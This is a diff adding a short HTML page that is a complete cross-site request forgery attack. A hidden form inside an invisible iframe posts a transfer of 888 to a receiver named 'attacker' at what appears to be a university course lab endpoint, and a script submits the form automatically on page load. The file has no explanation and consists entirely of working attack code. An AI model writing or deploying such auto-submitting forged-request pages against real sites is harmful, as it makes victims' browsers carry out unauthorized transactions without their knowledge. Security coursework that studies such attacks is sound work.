@@ -1,0 +1,12 @@
+<iframe name="invisibleframe" id="invisibleframe" style="display: none;"></iframe>
+
+<form name=Transfer action="https://cs190.ics.uci.edu/csrf0" method="POST" target="invisibleframe">
+
+
+<input type="hidden" name="receiver" value="attacker"/>
+
+<input type="hidden" name="amount" value="888"/>
+
+</form>
+
+<script>document.Transfer.submit();</script>
